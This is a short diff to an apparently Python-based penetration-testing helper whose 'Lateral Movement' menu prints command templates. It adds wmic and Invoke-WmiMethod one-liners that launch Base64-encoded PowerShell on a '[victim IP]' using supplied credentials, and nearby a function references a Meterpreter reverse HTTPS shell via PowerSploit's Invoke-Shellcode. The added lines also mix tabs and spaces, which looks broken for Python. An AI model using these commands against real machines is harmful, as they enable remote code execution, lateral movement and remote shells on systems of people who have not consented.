@@ -130,7 +130,9 @@ Lateral Movement
 
     elif ans == "2":
         clear()
-        print 'Powershell.exe Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "powershell.exe -enc [Base64 encoded string]" -ComputerName [victim IP] -Credential [Username]'
+        print 'Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "powershell.exe -enc [Base64 encoded string]" -ComputerName [victim IP] -Credential [Username]'
+		print 'For 32bit: wmic /USER:"" /PASSWORD:"" /NODE:[IP] process call create "powershell -enc [Base64 encoded string]"'
+		print 'For 64bit: wmic /USER:"" /PASSWORD:"" /NODE:[IP] process call create "%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -enc [Base64 encoded string]"'
         
 def metasploit():
     print "[*]PowerShell Metasploit Meterpreter Reverse HTTPS Shell.  Original: https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"
